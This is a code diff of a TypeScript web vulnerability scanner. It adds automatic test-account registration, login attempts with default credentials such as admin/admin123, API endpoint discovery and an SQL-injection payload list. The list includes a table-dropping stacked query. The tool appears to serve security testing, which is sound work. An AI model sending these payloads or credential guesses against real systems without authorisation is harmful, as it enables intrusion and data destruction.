@@ -3,13 +3,31 @@ import { retrieveContext } from "./rag";
 import { generateFixReport } from "./cerebras";
 import { emitLog, cleanupScan } from "./scan-logger";
 import { sendScanReportEmail } from "./mail";
-import { renderWithBrowser } from "./browser";
+import { renderWithBrowser, interactiveFormInjection, auditClientStorage, type InteractiveInjectionResult, type StorageFinding } from "./browser";
 import { runNmapScan, type NmapFinding } from "./nmap";
-// FIX #1: AST parsing
+import { registerScanController, cleanupScanController } from "./scan-controller";
+import { acquireBrowser, releaseBrowser, destroyBrowser } from "./browser-pool";
+import * as tls from "tls";
 // @ts-ignore
 import * as acorn from "acorn";
 // @ts-ignore
 import { simple as walkSimple } from "acorn-walk";
+// ─── Modern Library Imports ───────────────────────────────────────────────────
+import * as cheerio from "cheerio";
+import semver from "semver";
+import { CookieJar } from "tough-cookie";
+import pLimit from "p-limit";
+import { XMLParser } from "fast-xml-parser";
+import SwaggerParser from "@apidevtools/swagger-parser";
+import jwt from "jsonwebtoken";
+
+// ─── Modular Probe Sub-Modules ────────────────────────────────────────────────
+import { buildPayloadTarget } from "./scanner/payloads";
+import { extractHtmlLinksAndForms, isSpaHtmlFallback as isSpaHtmlFallbackModule } from "./scanner/crawler";
+import { probeSQLiMultiFormat } from "./scanner/probes/sqli";
+import { probeReflectedXSSMultiFormat, analyzeDomXssEvents } from "./scanner/probes/xss";
+import { checkGraphQLIntrospection as checkGraphQLIntrospectionModule, probeNoSQLiJson } from "./scanner/probes/api";
+
 
 interface PendingFinding {
   type: string;
@@ -19,6 +37,10 @@ interface PendingFinding {
   evidence?: string;
   cvssScore: number;
   cveId?: string;
+  // ── False-positive reduction fields (optional — defaulted in findings.push) ─
+  confidence?: number;         // 0.0 – 1.0: how certain we are this is real
+  validationSteps?: string[];  // proof trail: each step that confirmed the finding
+  isVerified?: boolean;        // true = multiple independent signals confirmed it
 }
 
 const FETCH_HEADERS = {
@@ -28,6 +50,45 @@ const FETCH_HEADERS = {
 };
 
 // ─────────────────────────────────────────────────────────────────────────────
+// CONFIDENCE HELPERS
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * Confidence levels used across probes.
+ * DETERMINISTIC = header present/absent (near-certain)
+ * DUAL_VERIFIED  = two independent payloads confirmed (very high)
+ * TIMING_VERIFIED = timing-based with multiple measurements (high)
+ * SINGLE_PAYLOAD  = one payload reflected/matched (moderate)
+ * PASSIVE_SIGNAL  = parameter name or pattern match only (low)
+ */
+const CONFIDENCE = {
+  DETERMINISTIC: 0.99,
+  DUAL_VERIFIED: 0.95,
+  TIMING_VERIFIED: 0.90,
+  EXEC_VERIFIED: 0.93,
+  SINGLE_PAYLOAD: 0.55,
+  PASSIVE_SIGNAL: 0.20,
+} as const;
+
+/** Build a verified finding (dual-payload or multi-step confirmed). */
+function verifiedFinding(
+  base: Omit<PendingFinding, "confidence" | "validationSteps" | "isVerified">,
+  steps: string[],
+  confidence: number = CONFIDENCE.DUAL_VERIFIED
+): PendingFinding {
+  return { ...base, confidence, validationSteps: steps, isVerified: true };
+}
+
+/** Build an unverified (passive/single-event) finding. */
+function passiveFinding(
+  base: Omit<PendingFinding, "confidence" | "validationSteps" | "isVerified">,
+  steps: string[],
+  confidence: number = CONFIDENCE.PASSIVE_SIGNAL
+): PendingFinding {
+  return { ...base, confidence, validationSteps: steps, isVerified: false };
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // UTILITY
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -35,9 +96,17 @@ function safeUrlJoin(base: string, path: string): string | null {
   try { return new URL(path, base).toString(); } catch { return null; }
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// FIX #2: AUTHENTICATED SCANNING — Session manager
-// ─────────────────────────────────────────────────────────────────────────────
+/** Helper to detect Single Page Application (SPA) HTML fallback responses. */
+function isSpaHtmlFallback(resp: Response | null, bodyText: string): boolean {
+  if (!resp) return false;
+  const contentType = (resp.headers.get("content-type") || "").toLowerCase();
+  const trimmed = (bodyText || "").trim().toLowerCase();
+  if (contentType.includes("text/html") || trimmed.startsWith("<!doctype html") || trimmed.includes("<html") || trimmed.includes("<head>")) {
+    return true;
+  }
+  return false;
+}
+
 
 interface AuthSession {
   cookies: string;
@@ -49,7 +118,8 @@ interface AuthSession {
   bearerToken2: string;
 }
 
-const session: AuthSession = {
+/** Sentinel used as the default when no auth has been acquired. */
+const EMPTY_SESSION: AuthSession = {
   cookies: "",
   bearerToken: "",
   csrfToken: "",
@@ -59,70 +129,196 @@ const session: AuthSession = {
   bearerToken2: "",
 };
 
-async function attemptAutoLogin(targetUrl: string, log: (m: string) => void): Promise<void> {
-  const REST_LOGIN_PATHS = [
-    "/rest/user/login", "/api/auth/login", "/api/login",
-    "/api/v1/auth/login", "/auth/login", "/login",
+
+async function attemptAutoRegister(targetUrl: string, log: (m: string) => void): Promise<void> {
+  const REGISTER_PATHS = [
+    "/api/auth/register", "/api/register", "/api/users",
+    "/api/signup", "/api/auth/signup", "/register",
+    "/rest/user/register", "/api/v1/auth/register", "/api/v1/users",
   ];
-  const TEST_ACCOUNTS = [
-    { email: "scanner_test_1@vulnscan.internal", password: "VulnScan@Test1!" },
-    { email: "scanner_test_2@vulnscan.internal", password: "VulnScan@Test2!" },
-    { email: "admin@juice-sh.op", password: "admin123" },
-    { email: "test@test.com", password: "test" },
-    { email: "user@example.com", password: "password" },
+  const SCANNER_ACCOUNTS = [
+    { email: "scanner_test_1@vulnscan.internal", password: "VulnScan@Test1!", name: "Scanner Test1", username: "scannertest1" },
+    { email: "scanner_test_2@vulnscan.internal", password: "VulnScan@Test2!", name: "Scanner Test2", username: "scannertest2" },
   ];
 
-  log("🔑  Attempting authenticated session acquisition...");
+  log("📝  Attempting auto-registration of scanner test accounts...");
 
-  for (const path of REST_LOGIN_PATHS) {
+  for (const path of REGISTER_PATHS) {
     const url = safeUrlJoin(targetUrl, path);
     if (!url) continue;
 
-    const baseline = await fetch(url, {
+    // Probe endpoint liveness with a throwaway request
+    const probe = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
-      body: JSON.stringify({ email: "probe@probe.com", password: "probe" }),
+      body: JSON.stringify({ email: "probe_check@probe.invalid", password: "probe123!" }),
       signal: AbortSignal.timeout(5000),
       // @ts-ignore
       next: { revalidate: 0 },
     }).catch(() => null);
 
-    if (!baseline || baseline.status === 404 || baseline.status >= 502) continue;
+    // Skip 404 (endpoint doesn't exist) and server errors
+    if (!probe || probe.status === 404 || probe.status >= 502) {
+      log(`ℹ️  Registration endpoint ${path} not available (status: ${probe?.status || 'no response'})`);
+      continue;
+    }
+
+    log(`🔍  Found potential registration endpoint: ${path} (status: ${probe.status})`);
+    let registeredAny = false;
+    for (const account of SCANNER_ACCOUNTS) {
+      try {
+        // Try multiple common registration body shapes
+        const bodies = [
+          { email: account.email, password: account.password, name: account.name },
+          { email: account.email, password: account.password, username: account.username },
+          { email: account.email, password: account.password, passwordRepeat: account.password, securityQuestion: { id: 1 }, securityAnswer: "scanner" },
+        ];
+        for (const body of bodies) {
+          const resp = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
+            body: JSON.stringify(body),
+            signal: AbortSignal.timeout(6000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+          if (!resp) continue;
+          // 200/201 = created, 409/400 = already exists or duplicate — both are fine
+          if (resp.status === 200 || resp.status === 201) {
+            log(`✅  Registered test account: ${account.email}`);
+            registeredAny = true;
+            break;
+          } else if (resp.status === 409 || resp.status === 422) {
+            log(`ℹ️  Test account already exists: ${account.email}`);
+            registeredAny = true;
+            break;
+          } else {
+            log(`⚠️  Registration failed for ${account.email}: HTTP ${resp.status}`);
+          }
+        }
+      } catch (err) {
+        log(`⚠️  Registration error for ${account.email}: ${err instanceof Error ? err.message : String(err)}`);
+      }
+    }
+    if (registeredAny) {
+      log(`✅  Registration successful via ${path}`);
+      break; // Found the registration endpoint; done
+    }
+  }
+}
+
+async function attemptAutoLogin(targetUrl: string, log: (m: string) => void, session: AuthSession): Promise<void> {
+  const REST_LOGIN_PATHS = [
+    "/rest/user/login", "/api/auth/login", "/api/login",
+    "/api/v1/auth/login", "/auth/login", "/login", "/admin/login",
+    "/accounts/login", "/token", "/api/token", "/api/v1/login",
+    "/api/auth/callback/credentials",
+  ];
+  const TEST_ACCOUNTS = [
+    { email: "scanner_test_1@vulnscan.internal", username: "scannertest1", password: "VulnScan@Test1!" },
+    { email: "scanner_test_2@vulnscan.internal", username: "scannertest2", password: "VulnScan@Test2!" },
+    { email: "admin@juice-sh.op", username: "admin", password: "admin123" },
+    { email: "test@test.com", username: "test", password: "test" },
+    { email: "user@example.com", username: "user", password: "password" },
+  ];
+
+  log("🔑  Attempting authenticated session acquisition...");
+
+  // Register scanner test accounts first so they exist on fresh targets
+  await attemptAutoRegister(targetUrl, log);
+
+  for (const path of REST_LOGIN_PATHS) {
+    const url = safeUrlJoin(targetUrl, path);
+    if (!url) continue;
 
     let sessionsFilled = 0;
     for (const creds of TEST_ACCOUNTS) {
       if (sessionsFilled >= 2) break;
       try {
-        const resp = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
-          body: JSON.stringify({ email: creds.email, password: creds.password }),
-          signal: AbortSignal.timeout(6000),
-          // @ts-ignore
-          next: { revalidate: 0 },
-        }).catch(() => null);
-        if (!resp || resp.status !== 200) continue;
-        const text = await resp.text();
-        let json: any;
-        try { json = JSON.parse(text); } catch { continue; }
-        const token = json?.token || json?.data?.token || json?.authentication?.token ||
-          json?.access_token || json?.accessToken || json?.jwt;
-        const userId = String(json?.data?.id || json?.id || json?.user?.id || json?.userId || "");
-        const rawCookie = resp.headers.get("set-cookie") || "";
-        if (sessionsFilled === 0) {
-          if (token) session.bearerToken = token;
-          if (rawCookie) session.cookies = rawCookie.split(";")[0];
-          if (userId) session.userId = userId;
-          sessionsFilled++;
-          log(`✅  Auth session 1 acquired (${creds.email})`);
-        } else if (sessionsFilled === 1) {
-          if (token) session.bearerToken2 = token;
-          if (rawCookie) session.cookies2 = rawCookie.split(";")[0];
-          if (userId) session.userId2 = userId;
-          sessionsFilled++;
-          log(`✅  Auth session 2 acquired (${creds.email}) — for IDOR dual-token probing`);
+        // Build payload variations: JSON body & Form-urlencoded body (for Django/FastAPI/OAuth2)
+        const payloadConfigs = [
+          {
+            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
+            body: JSON.stringify({ email: creds.email, password: creds.password }),
+          },
+          {
+            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
+            body: JSON.stringify({ username: creds.username, password: creds.password }),
+          },
+          {
+            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
+            body: new URLSearchParams({ username: creds.username, password: creds.password, grant_type: "password" }).toString(),
+          },
+          {
+            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
+            body: new URLSearchParams({ email: creds.email, password: creds.password }).toString(),
+          },
+        ];
+
+        for (const config of payloadConfigs) {
+          const resp = await fetch(url, {
+            method: "POST",
+            headers: config.headers,
+            body: config.body,
+            signal: AbortSignal.timeout(6000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+
+          if (!resp || (resp.status !== 200 && resp.status !== 201 && resp.status !== 302)) continue;
+
+          const text = await resp.text().catch(() => "");
+          let json: any = null;
+          try { json = JSON.parse(text); } catch { /* text or redirect response */ }
+
+          const token = json?.token || json?.data?.token || json?.authentication?.token ||
+            json?.access_token || json?.accessToken || json?.jwt;
+          const userId = String(json?.data?.id || json?.id || json?.user?.id || json?.userId || "");
+          const rawCookie = resp.headers.get("set-cookie") || "";
+
+          if (token || rawCookie) {
+            if (sessionsFilled === 0) {
+              if (token) session.bearerToken = token;
+              if (rawCookie) {
+                try {
+                  const jar = new CookieJar();
+                  const cookieStrings = rawCookie.split(/,(?=[^ ])/);
+                  for (const cs of cookieStrings) {
+                    await jar.setCookie(cs.trim(), url).catch(() => {});
+                  }
+                  session.cookies = await jar.getCookieString(url);
+                } catch {
+                  session.cookies = rawCookie.split(";")[0];
+                }
+              }
+              if (userId) session.userId = userId;
+              sessionsFilled++;
+              log(`✅  Auth session 1 acquired (${creds.email}) via ${path}`);
+              break;
+            } else if (sessionsFilled === 1) {
+              if (token) session.bearerToken2 = token;
+              if (rawCookie) {
+                try {
+                  const jar = new CookieJar();
+                  const cookieStrings = rawCookie.split(/,(?=[^ ])/);
+                  for (const cs of cookieStrings) {
+                    await jar.setCookie(cs.trim(), url).catch(() => {});
+                  }
+                  session.cookies2 = await jar.getCookieString(url);
+                } catch {
+                  session.cookies2 = rawCookie.split(";")[0];
+                }
+              }
+              if (userId) session.userId2 = userId;
+              sessionsFilled++;
+              log(`✅  Auth session 2 acquired (${creds.email}) — for IDOR dual-token probing`);
+              break;
+            }
+          }
         }
-      } catch { /* try next */ }
+      } catch (err) {
+        log(`⚠️  Login error for ${creds.email}: ${err instanceof Error ? err.message : String(err)}`);
+      }
     }
     if (sessionsFilled > 0) break;
   }
@@ -131,7 +327,7 @@ async function attemptAutoLogin(targetUrl: string, log: (m: string) => void): Pr
   }
 }
 
-function authHeaders(useSecondSession = false): Record<string, string> {
+function authHeaders(session: AuthSession, useSecondSession = false): Record<string, string> {
   const token = useSecondSession ? session.bearerToken2 : session.bearerToken;
   const cookies = useSecondSession ? session.cookies2 : session.cookies;
   const extra: Record<string, string> = {};
@@ -146,12 +342,13 @@ async function authedFetch(
   url: string,
   options: RequestInit = {},
   timeoutMs = 8000,
-  useSecondSession = false
+  useSecondSession = false,
+  session: AuthSession = EMPTY_SESSION
 ): Promise<Response | null> {
   try {
     const headers: Record<string, string> = {
       ...FETCH_HEADERS,
-      ...authHeaders(useSecondSession),
+      ...authHeaders(session, useSecondSession),
       ...(options.headers as Record<string, string> || {}),
     };
     return await fetch(url, {
@@ -166,10 +363,6 @@ async function authedFetch(
   }
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// FIX #7: RATE-LIMITED PROBE QUEUE
-// ─────────────────────────────────────────────────────────────────────────────
-
 const PROBE_CONCURRENCY = 3;
 const PROBE_DELAY_MS = 150;
 
@@ -177,25 +370,29 @@ async function sleep(ms: number): Promise<void> {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+/**
+ * Battle-tested concurrency control using p-limit.
+ * Replaces the manual worker-queue approach which silently swallowed errors.
+ * p-limit handles backpressure, proper error propagation, and per-task timeouts.
+ */
 async function throttledProbes<T>(
   probes: (() => Promise<T | null>)[],
   concurrency = PROBE_CONCURRENCY,
-  delayMs = PROBE_DELAY_MS
+  _delayMs = PROBE_DELAY_MS  // kept for API compatibility; p-limit handles pacing
 ): Promise<T[]> {
+  const limit = pLimit(concurrency);
+  const settled = await Promise.allSettled(
+    probes.map(probe => limit(async () => {
+      try { return await probe(); }
+      catch { return null; }
+    }))
+  );
   const results: T[] = [];
-  const queue = [...probes];
-  async function worker() {
-    while (queue.length > 0) {
-      const probe = queue.shift();
-      if (!probe) break;
-      try {
-        const result = await probe();
-        if (result !== null && result !== undefined) results.push(result);
-      } catch { /* skip */ }
-      await sleep(delayMs);
+  for (const r of settled) {
+    if (r.status === "fulfilled" && r.value !== null && r.value !== undefined) {
+      results.push(r.value);
     }
   }
-  await Promise.all(Array.from({ length: concurrency }, () => worker()));
   return results;
 }
 
@@ -209,9 +406,9 @@ interface FormTarget {
 }
 
 /**
- * Parse all same-origin HTML forms from a page.
- * Extracts action URL, method (default POST), and all text-like input field names.
- * FIX #4: Also detects React-style inputs (id/data-testid) and increases cap to 12.
+ * Parse all same-origin HTML forms from a page using cheerio.
+ * Cheerio gives accurate DOM traversal even on minified, malformed, or JSX-adjacent HTML
+ * where regex-based parsing breaks on attribute ordering or embedded JSON in <script> tags.
  */
 function extractForms(html: string, baseUrl: string): FormTarget[] {
   const base = new URL(baseUrl);
@@ -219,98 +416,91 @@ function extractForms(html: string, baseUrl: string): FormTarget[] {
   const INJECTABLE_TYPES = /^(text|search|email|number|tel|url|hidden|password|)$/i;
   const seen = new Set<string>();
 
-  for (const formMatch of html.matchAll(/<form(\s[^>]*)>([\s\S]*?)<\/form>/gi)) {
-    try {
-      const attrs = formMatch[1] ?? "";
-      const body = formMatch[2] ?? "";
+  try {
+    const $ = cheerio.load(html);
+    $('form').each((_, formEl) => {
+      try {
+        const rawAction = $(formEl).attr('action') || baseUrl;
+        const actionUrl = new URL(rawAction, baseUrl);
+        if (actionUrl.hostname !== base.hostname) return;
 
-      // Resolve action URL (default to current page)
-      const actionMatch = attrs.match(/action=["']([^"']+)["']/i);
-      const rawAction = actionMatch ? actionMatch[1].trim() : baseUrl;
-      const actionUrl = new URL(rawAction, baseUrl);
-      if (actionUrl.hostname !== base.hostname) continue; // skip cross-origin forms
+        const methodRaw = ($(formEl).attr('method') || 'POST').toUpperCase();
+        const method: 'GET' | 'POST' = methodRaw === 'GET' ? 'GET' : 'POST';
 
-      // Method (default GET if not specified, but POST is far more common for data forms)
-      const methodMatch = attrs.match(/method=["']?(get|post)["']?/i);
-      const method: "GET" | "POST" = methodMatch
-        ? (methodMatch[1].toUpperCase() as "GET" | "POST")
-        : "POST";
+        const fields: string[] = [];
+        // Named text-like inputs + textarea + select
+        $(formEl).find('input, textarea, select').each((_, el) => {
+          const name = $(el).attr('name');
+          const type = ($(el).attr('type') || '').toLowerCase();
+          if (name && INJECTABLE_TYPES.test(type)) {
+            fields.push(name);
+          } else if (name && ($(el).is('textarea') || $(el).is('select'))) {
+            fields.push(name);
+          } else if (!name) {
+            // React-style: use id or data-testid as synthetic name
+            const synth = $(el).attr('id') || $(el).attr('data-testid');
+            if (synth) fields.push(synth);
+          }
+        });
 
-      // Collect all injectable input field names
-      const fields: string[] = [];
-      for (const inputMatch of body.matchAll(/<input(\s[^>]*)?\/?>|<textarea(\s[^>]*)>/gi)) {
-        const inputAttrs = inputMatch[1] ?? inputMatch[2] ?? "";
-        const typeMatch = inputAttrs.match(/type=["']?([^"'\s>]+)["']?/i);
-        const nameMatch = inputAttrs.match(/name=["']([^"']+)["']/i);
-        if (!nameMatch) continue;
-        const fieldType = typeMatch ? typeMatch[1] : "";
-        // Inject into any text-like field (including password for default-creds testing)
-        if (INJECTABLE_TYPES.test(fieldType)) {
-          fields.push(nameMatch[1]);
+        const key = `${actionUrl.toString()}|${fields.slice().sort().join(',')}`;
+        if (!seen.has(key) && fields.length > 0) {
+          seen.add(key);
+          forms.push({ actionUrl: actionUrl.toString(), method, fields });
         }
-      }
-      // Also grab <select> and <textarea> names
-      for (const selMatch of body.matchAll(/<(?:select|textarea)(\s[^>]*)?>/gi)) {
-        const selAttrs = selMatch[1] ?? "";
-        const nameMatch = selAttrs.match(/name=["']([^"']+)["']/i);
-        if (nameMatch) fields.push(nameMatch[1]);
-      }
+      } catch { /* skip malformed form */ }
+    });
+  } catch { /* skip entirely unparseable HTML */ }
 
-      // FIX #4: detect React-style inputs with id/data-testid but no name attr
-      for (const inputMatch of body.matchAll(/<input(\s[^>]*)?\/?>|<textarea(\s[^>]*)>/gi)) {
-        const inputAttrs = inputMatch[1] ?? inputMatch[2] ?? "";
-        if (/name=/i.test(inputAttrs)) continue; // already captured above
-        const idMatch = inputAttrs.match(/(?:id|data-testid)=["']([^"']+)["']/i);
-        const placeholderMatch = inputAttrs.match(/placeholder=["']([^"']{2,30})["']/i);
-        const syntheticName = idMatch?.[1] ?? placeholderMatch?.[1]?.toLowerCase().replace(/\s+/g, "_");
-        if (syntheticName) fields.push(syntheticName);
-      }
-
-      const key = `${actionUrl.toString()}|${fields.slice().sort().join(",")}`;
-      if (seen.has(key)) continue;
-      seen.add(key);
-
-      if (fields.length > 0) {
-        forms.push({ actionUrl: actionUrl.toString(), method, fields });
-      }
-    } catch { /* skip malformed */ }
-  }
-  return forms.slice(0, 12); // increased from 8 to 12 for SPAs
+  return forms.slice(0, 12);
 }
 
-/** Extract same-origin links from HTML, excluding static assets. Capped at 30. */
+/** Extract same-origin links from HTML using cheerio. Excludes static assets. Capped at 50. */
 function extractSameOriginLinks(html: string, baseUrl: string): string[] {
   const base = new URL(baseUrl);
   const links = new Set<string>();
-  for (const m of html.matchAll(/(?:href|action)=["']([^"'#][^"']*)["']/gi)) {
-    try {
-      const u = new URL(m[1], baseUrl);
-      if (
-        u.hostname === base.hostname &&
-        !/\.(css|js|png|jpg|gif|ico|woff|woff2|svg|pdf|map)$/i.test(u.pathname)
-      ) links.add(u.href);
-    } catch { /* skip malformed */ }
-  }
-  return [...links].slice(0, 30);
+  try {
+    const $ = cheerio.load(html);
+    $('a[href], [action]').each((_, el) => {
+      const href = $(el).attr('href') || $(el).attr('action');
+      if (!href) return;
+      try {
+        const u = new URL(href, baseUrl);
+        if (
+          u.hostname === base.hostname &&
+          !/\.(css|js|png|jpg|gif|ico|woff|woff2|svg|pdf|map)$/i.test(u.pathname)
+        ) links.add(u.href);
+      } catch { /* skip */ }
+    });
+  } catch { /* skip */ }
+  return [...links].slice(0, 50);
 }
 
-/** Extract same-origin URLs that carry query params (for active injection tests). Capped at 10. */
+/** Extract same-origin URLs with query params using cheerio. Capped at 10. */
 function extractParamUrls(html: string, baseUrl: string): string[] {
   const base = new URL(baseUrl);
   const out = new Set<string>();
-  for (const m of html.matchAll(/(?:href|action)=["']([^"']*\?[^"'&][^"']*)["']/gi)) {
-    try {
-      const u = new URL(m[1], baseUrl);
-      if (u.hostname === base.hostname && [...u.searchParams.keys()].length > 0)
-        out.add(u.href);
-    } catch { /* skip */ }
-  }
+  try {
+    const $ = cheerio.load(html);
+    $('[href], [action]').each((_, el) => {
+      const val = $(el).attr('href') || $(el).attr('action');
+      if (!val || !val.includes('?')) return;
+      try {
+        const u = new URL(val, baseUrl);
+        if (u.hostname === base.hostname && [...u.searchParams.keys()].length > 0)
+          out.add(u.href);
+      } catch { /* skip */ }
+    });
+  } catch { /* skip */ }
   return [...out].slice(0, 10);
 }
 
-/** Extract API/REST/GraphQL path references from inline HTML & scripts. Capped at 20. */
+/**
+ * Extract API path references from inline scripts using cheerio.
+ * Only scans <script> text content to avoid false matches in HTML attributes.
+ * Capped at 20.
+ */
 function extractApiEndpoints(html: string, baseUrl: string): string[] {
-  const base = new URL(baseUrl);
   const out = new Set<string>();
   const pats = [
     /["'`](\/api\/[^\s"'`?#]{3,80})/g,
@@ -318,25 +508,53 @@ function extractApiEndpoints(html: string, baseUrl: string): string[] {
     /["'`](\/v\d+\/[^\s"'`?#]{3,80})/g,
     /["'`](\/graphql[^\s"'`?#]{0,40})/gi,
   ];
-  for (const pat of pats)
-    for (const m of html.matchAll(pat)) {
-      try { new URL(m[1], baseUrl); out.add(m[1]); } catch { /* skip */ }
-    }
+  try {
+    const $ = cheerio.load(html);
+    // Only scan inline script text content — avoids false matches in HTML attributes
+    const scriptText = $('script:not([src])').map((_, el) => $(el).text()).get().join('\n');
+    for (const pat of pats)
+      for (const m of scriptText.matchAll(pat)) {
+        try { new URL(m[1], baseUrl); out.add(m[1]); } catch { /* skip */ }
+      }
+  } catch { /* fallback: skip */ }
   return [...out].slice(0, 20);
 }
 
-/** Parse sitemap.xml and return same-origin URLs. Capped at 25. */
+/**
+ * Parse sitemap.xml using fast-xml-parser for robust XML handling.
+ * Handles nested <sitemap> indexes, CDATA sections, and namespace prefixes
+ * that break the regex-based approach.
+ */
 function parseSitemap(xml: string, baseUrl: string): string[] {
   const base = new URL(baseUrl);
   const urls: string[] = [];
-  for (const m of xml.matchAll(/<loc>(https?:\/\/[^<]+)<\/loc>/gi)) {
-    try {
-      const u = new URL(m[1].trim());
-      if (u.hostname === base.hostname) urls.push(u.href);
-    } catch { /* skip */ }
+  try {
+    const parser = new XMLParser({ ignoreAttributes: false, cdataPropName: '__cdata' });
+    const result = parser.parse(xml);
+    // Support both urlset/url/loc and sitemapindex/sitemap/loc
+    const urlset = result?.urlset?.url || result?.sitemapindex?.sitemap || [];
+    const items = Array.isArray(urlset) ? urlset : [urlset];
+    for (const item of items) {
+      const loc = item?.loc || item?.__cdata || '';
+      if (typeof loc === 'string') {
+        try {
+          const u = new URL(loc.trim());
+          if (u.hostname === base.hostname) urls.push(u.href);
+        } catch { /* skip */ }
+      }
+    }
+  } catch {
+    // Fallback to regex for malformed XML
+    for (const m of xml.matchAll(/<loc>(https?:\/\/[^<]+)<\/loc>/gi)) {
+      try {
+        const u = new URL(m[1].trim());
+        if (u.hostname === base.hostname) urls.push(u.href);
+      } catch { /* skip */ }
+    }
   }
   return urls.slice(0, 25);
 }
+
 
 /**
  * Download same-origin JS bundle files and extract:
@@ -357,6 +575,41 @@ async function extractJsBundleEndpoints(html: string, baseUrl: string): Promise<
   const base = new URL(baseUrl);
   const results: JsApiEndpoint[] = [];
 
+  // Step 0: Probe common OpenAPI / Swagger paths (FastAPI, Django REST, Spring Boot, NestJS)
+  const OPENAPI_PATHS = [
+    "/openapi.json", "/swagger.json", "/v1/openapi.json",
+    "/api/openapi.json", "/api/v1/openapi.json", "/api/schema/",
+  ];
+
+  for (const oPath of OPENAPI_PATHS) {
+    try {
+      const oUrl = safeUrlJoin(baseUrl, oPath);
+      if (!oUrl) continue;
+      const resp = await fetch(oUrl, {
+        headers: FETCH_HEADERS,
+        signal: AbortSignal.timeout(4000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+      if (resp && resp.ok) {
+        const json = await resp.json().catch(() => null);
+        if (json && json.paths && typeof json.paths === "object") {
+          for (const [pathKey, methods] of Object.entries(json.paths)) {
+            if (!pathKey.startsWith("/")) continue;
+            const fields: string[] = [];
+            if (methods && typeof methods === "object") {
+              const postOp = (methods as any)?.post || (methods as any)?.put || (methods as any)?.get;
+              const bodyProps = postOp?.requestBody?.content?.["application/json"]?.schema?.properties || {};
+              fields.push(...Object.keys(bodyProps));
+            }
+            if (fields.length === 0) fields.push("q", "query", "id", "search", "email", "username", "password");
+            results.push({ path: pathKey, fields });
+          }
+        }
+      }
+    } catch { /* skip */ }
+  }
+
   // Step 1: Find all <script src="..."> tags pointing to same-origin JS files
   const scriptUrls: string[] = [];
   for (const m of html.matchAll(/<script[^>]+src=[\"']([^\"']+\.js[^\"']*)[\"']/gi)) {
@@ -366,11 +619,15 @@ async function extractJsBundleEndpoints(html: string, baseUrl: string): Promise<
     } catch { /* skip */ }
   }
 
-  // Also probe common SPA bundle paths that may not appear in the HTML
+  // Also probe common SPA bundle paths that may not appear in the HTML (expanded)
   const COMMON_BUNDLE_PATHS = [
-    "/main.js", "/bundle.js", "/app.js", "/vendor.js",
+    "/main.js", "/main-es2015.js", "/main-es5.js", "/polyfills-es2015.js", "/runtime-es2015.js", "/polyfills.js", "/runtime.js",
+    "/bundle.js", "/app.js", "/vendor.js",
     "/static/js/main.chunk.js", "/static/js/bundle.js",
-    "/runtime-main.js", "/scripts/app.js",
+    "/runtime-main.js", "/scripts/app.js", "/assets/js/main.js",
+    "/static/js/app.js", "/dist/js/app.js", "/build/static/js/main.js",
+    "/_next/static/chunks/main.js", "/_next/static/chunks/pages.js",
+    "/assets/index.js", "/js/app.js", "/public/js/app.js",
   ];
   for (const path of COMMON_BUNDLE_PATHS) {
     try { scriptUrls.push(new URL(path, baseUrl).href); } catch { /* skip */ }
@@ -384,7 +641,7 @@ async function extractJsBundleEndpoints(html: string, baseUrl: string): Promise<
       const resp = await fetch(jsUrl, {
         headers: FETCH_HEADERS,
         signal: AbortSignal.timeout(8000),
-
+        // @ts-ignore
         next: { revalidate: 0 },
       }).catch(() => null);
       if (!resp || !resp.ok) continue;
@@ -395,12 +652,16 @@ async function extractJsBundleEndpoints(html: string, baseUrl: string): Promise<
 
     if (!jsCode) continue;
 
-    // Step 3: Extract POST endpoint paths from fetch/axios/http.post calls
+    // Step 3: Extract POST endpoint paths from fetch/axios/http.post calls (expanded patterns)
     const endpointPatterns = [
       /fetch\(\s*[`"']([^`"']+)[`"']\s*,\s*\{[^}]*method\s*:\s*[`"']POST[`"']/gi,
       /(?:axios|http)\.post\(\s*[`"']([^`"']+)[`"']/gi,
       /\.post\(\s*[`"'](\/[^`"']{3,80})[`"']/gi,
       /\.open\(\s*[`"']POST[`"']\s*,\s*[`"']([^`"']+)[`"']/gi,
+      /["'`](\/api\/[^`"']{3,80})["']/gi, // General API paths
+      /["'`](\/rest\/[^`"']{3,80})["']/gi, // General REST paths
+      /["'`](\/v\d+\/[^`"']{3,80})["']/gi, // Versioned API paths
+      /["'`](\/[^`"']{5,80})["']/gi, // Any reasonable path
     ];
 
     const foundPaths = new Set<string>();
@@ -470,13 +731,16 @@ const SQL_ERROR_PATTERNS_ACTIVE = [
   /SQLITE_CONSTRAINT/i, /unrecognized token/i,
 ];
 
-// Multiple SQLi payloads: error-based, boolean-based, UNION-based
+// Multiple SQLi payloads: error-based, boolean-based, UNION-based, and nested parenthesis break-outs
 const SQLI_PAYLOADS = [
   "'",                           // basic single quote — triggers syntax errors
   "'--",                         // comment out rest of query
   "' OR '1'='1",                 // boolean always-true
   "' OR '1'='1'--",              // boolean with comment
   "1' AND 1=1--",                // numeric context boolean
+  "')) OR 1=1--",                // nested double parenthesis (SQLite / Juice Shop search query break-out)
+  "'))--",                       // nested double parenthesis comment
+  "') OR ('1'='1",               // single parenthesis OR
   "' UNION SELECT NULL--",       // UNION-based (1 column)
   "' UNION SELECT NULL,NULL--",  // UNION-based (2 columns)
   "; DROP TABLE users--",        // stacked query (rare but detectable)
